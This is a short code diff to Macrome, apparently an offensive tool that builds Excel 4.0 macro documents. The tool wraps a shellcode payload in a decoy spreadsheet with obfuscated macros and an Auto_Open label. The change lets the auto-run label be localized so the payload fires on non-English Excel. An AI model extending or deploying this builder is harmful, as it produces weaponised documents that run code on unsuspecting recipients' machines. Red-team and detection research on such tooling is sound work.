@@ -42,6 +42,7 @@ namespace Macrome
         /// <param name="dumpHexBytes">Dump the byte content of each BIFF record in addition to its content summary.</param>
         /// <param name="password">XOR Obfuscation decryption password to try. Defaults to VelvetSweatshop if FilePass record is found.</param>
         /// <param name="disableDecryption">Use this flag in order to skip decryption of the file before dumping.</param>
+
         public static void Dump(FileInfo path, bool dumpAll = false, bool showAttrInfo = false, bool dumpHexBytes = false, string password = "VelvetSweatshop", bool disableDecryption = false)
         {
             if (path == null)
@@ -183,10 +184,11 @@ namespace Macrome
         /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
         /// <param name="password">Password to encrypt document using XOR Obfuscation.</param>
         /// <param name="method">Which method to use for obfuscating macros. Defaults to ObfuscatedCharFunc. </param>
+        /// <param name="localizedLabel">Use this flag in order to set a localized label in case Excel is not in US language. Default to Auto_Open</param>
         public static void Build(FileInfo decoyDocument, FileInfo payload, FileInfo payload64Bit, string preamble,
             PayloadType payloadType = PayloadType.Shellcode, 
             string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false,
-            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, string password = "")
+            SheetPackingMethod method = SheetPackingMethod.ObfuscatedCharFunc, string password = "", string localizedLabel = "Auto_Open")
         {
             if (decoyDocument == null || payload == null)
             {
@@ -305,9 +307,9 @@ namespace Macrome
                      FormulaHelper.CreateCharInvocationFormulaForLblIndex(charInvocationRw, charInvocationCol, 2));
             }
 
-            wbe.AddLabel("Auto_Open", rwStart, colStart);
+            wbe.AddLabel(localizedLabel, rwStart, colStart);
 
-            wbe.ObfuscateAutoOpen();
+            wbe.ObfuscateAutoOpen(localizedLabel);
 
             WorkbookStream createdWorkbook = wbe.WbStream;
 
